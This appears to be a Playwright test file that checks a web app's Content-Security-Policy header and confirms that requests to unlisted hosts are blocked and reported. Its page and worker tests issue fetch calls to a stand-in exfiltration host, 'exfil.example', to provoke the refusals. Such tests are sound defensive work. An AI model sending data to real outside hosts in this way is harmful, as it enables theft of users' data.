import { expect, test } from './support/test'

/**
 * The Content-Security-Policy, as the browser applies it (#204).
 *
 * `connect-src` is a host list: a script in the origin cannot send anything
 * to a host the build did not name — not from the page, not from a worker.
 * And every other spec fails on a violation (support/test.ts), so a host the
 * app needs and the policy forgets shows up there.
 */
test('the preview sends the policy', async ({ page }) => {
  const response = await page.goto('/')
  const csp = response?.headers()['content-security-policy'] ?? ''
  expect(csp).toContain("connect-src 'self' https://api.discogs.com")
  expect(csp).not.toMatch(/connect-src[^;]* https:[ ;]/)
})

/** How often a line naming `needle` was heard. */
function heard(violations: string[], needle: string): number {
  return violations.filter((line) => line.includes(needle)).length
}

/** Drops what a test provoked on purpose; the fixture still fails on anything else. */
function forgetProvoked(violations: string[]): void {
  const kept = violations.filter((line) => !line.includes('exfil.example'))
  violations.splice(0, violations.length, ...kept)
}

test('a host the build did not name is refused, and the refusal is caught', async ({
  page,
  cspViolations,
}) => {
  await page.goto('/')

  const fromPage = await page.evaluate(() =>
    fetch('https://exfil.example/page').then(
      () => 'sent',
      () => 'refused',
    ),
  )
  expect(fromPage).toBe('refused')
  // Heard twice: by the document's event and by the report-uri POST. Waiting
  // for both keeps a late second copy from failing the teardown.
  await expect.poll(() => heard(cspViolations, 'exfil.example/page')).toBe(2)
  forgetProvoked(cspViolations)
})

test('a refusal in the worker is caught too', async ({ page, cspViolations, browserName }) => {
  // The worker is where every Discogs request runs, and where the page's
  // own event listener hears nothing. WebKit refuses the request but sends
  // no report from a worker (measured 2026-11-01), so only Chromium can show
  // that the suite hears it.
  test.skip(browserName === 'webkit', 'WebKit sends no CSP report from a worker')
  await page.goto('/')

  const fromWorker = await page.evaluate(
    () =>
      new Promise<string>((resolve) => {
        const source = `fetch('https://exfil.example/worker').then(() => postMessage('sent'), () => postMessage('refused'))`
        const worker = new Worker(URL.createObjectURL(new Blob([source])))
        worker.onmessage = (event) => resolve(String(event.data))
      }),
  )
  expect(fromWorker).toBe('refused')
  // Only the report: the worker's own event fires in the worker.
  await expect.poll(() => heard(cspViolations, 'exfil.example/worker')).toBe(1)
  forgetProvoked(cspViolations)
})
